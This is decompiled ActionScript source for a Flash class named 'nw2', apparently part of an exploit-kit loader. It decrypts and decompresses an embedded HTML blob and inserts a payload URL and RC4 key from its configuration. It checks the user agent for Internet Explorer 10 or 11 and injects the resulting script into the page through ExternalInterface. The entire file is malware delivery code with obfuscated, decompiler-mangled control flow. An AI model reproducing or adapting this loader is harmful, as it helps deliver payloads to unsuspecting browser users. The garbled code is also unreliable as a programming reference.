package blobs
{
   import flash.external.ExternalInterface;
   import flash.utils.ByteArray;
   import Crypt.Crypt;
   
   public final class nw2
   {
       
      private var targets_info:Object;
      
      private var config_json:Object;
      
      private var m_myClass05:Class;
      
      private var m_myStr08:String;
      
      public function nw2(param1:Object, param2:Object)
      {
         if(!_loc7_)
         {
            m_myClass05 = nw2_html_rc4$1ac42c440ee054681c013a3a3f4c7c791142556130;
            if(!_loc6_)
            {
               if(!_loc7_)
               {
               }
               super();
               if(_loc7_)
               {
               }
            }
            addr112:
            if(!_loc7_)
            {
            }
            return;
         }
         if(!_loc6_)
         {
         }
         this.config_json = param1;
         if(!_loc6_)
         {
            if(_loc6_)
            {
               addr67:
               while(true)
               {
                  this.m_myStr08 = "edfdamtlkfg511485";
                  if(!_loc7_)
                  {
                     if(!_loc7_)
                     {
                     }
                     addr102:
                     §§push(false);
                     if(!_loc7_)
                     {
                        if(§§pop() === this.isSuitable())
                        {
                           if(!_loc6_)
                           {
                              break;
                           }
                        }
                        else
                        {
                           §§push(false);
                        }
                        addr130:
                        return;
                     }
                     if(§§pop() === this.targets_info.isIe)
                     {
                        §§goto(addr130);
                     }
                     else
                     {
                        _loc4_.uncompress("deflate");
                        if(!_loc7_)
                        {
                           §§push(_loc5_);
                           if(!_loc7_)
                           {
                              §§push("%payloadUrl%");
                              if(!_loc7_)
                              {
                                 §§push(§§pop().replace(§§pop(),this.config_json.link.pnw2));
                                 if(!_loc6_)
                                 {
                                    if(!_loc6_)
                                    {
                                       §§push("%payloadRc4Key%");
                                       if(_loc6_)
                                       {
                                       }
                                       addr241:
                                       while(true)
                                       {
                                       }
                                    }
                                    addr240:
                                    while(true)
                                    {
                                       §§goto(addr241);
                                    }
                                 }
                              }
                              §§push(§§pop().replace(§§pop(),this.config_json.key.payload));
                              if(!_loc7_)
                              {
                                 if(!_loc6_)
                                 {
                                    if(_loc6_)
                                    {
                                       addr204:
                                       while(true)
                                       {
                                          ExternalInterface.call("function (){" + _loc3_ + "}");
                                          if(_loc6_)
                                          {
                                          }
                                       }
                                    }
                                    addr236:
                                    while(true)
                                    {
                                       §§push(_loc3_);
                                       if(!_loc7_)
                                       {
                                          §§goto(addr240);
                                       }
                                    }
                                 }
                                 addr248:
                                 while(true)
                                 {
                                    if(_loc7_)
                                    {
                                       break;
                                    }
                                    §§goto(addr204);
                                 }
                                 return;
                              }
                           }
                           while(true)
                           {
                              §§goto(addr248);
                           }
                        }
                        while(true)
                        {
                           if(_loc6_)
                           {
                              §§goto(addr236);
                           }
                           §§goto(addr259);
                        }
                     }
                  }
                  break;
               }
            }
            while(true)
            {
               this.targets_info = param2;
               if(!_loc6_)
               {
                  if(!_loc7_)
                  {
                     §§goto(addr67);
                  }
                  §§goto(addr102);
               }
               break;
            }
            §§goto(addr130);
         }
         §§goto(addr112);
      }
      
      private final function isSuitable() : Boolean
      {
         var _loc1_:Boolean = ExternalInterface.call("function(){return !/Trident\\/7.0|Trident\\/6.0/ig.test(window.navigator.userAgent);}");
         return _loc1_;
      }
   }
}
